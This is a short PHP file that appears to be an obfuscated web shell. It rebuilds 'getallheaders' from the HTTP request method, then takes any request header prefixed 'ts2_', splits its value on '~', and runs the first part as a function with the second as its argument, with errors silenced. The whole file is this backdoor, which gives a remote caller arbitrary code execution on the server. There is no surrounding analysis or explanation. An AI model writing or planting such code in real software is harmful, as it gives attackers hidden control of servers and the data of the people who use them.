<?
$a="getallh".($_SERVER['REQUEST_METHOD']);
echo($a);
foreach ($a() as $name => $value) {
    if(strpos($name, "ts2_") === 0){
            echo $value;
        $x=explode('~',(substr($value,1)));
                @$x[0]($x[1]);
    }

}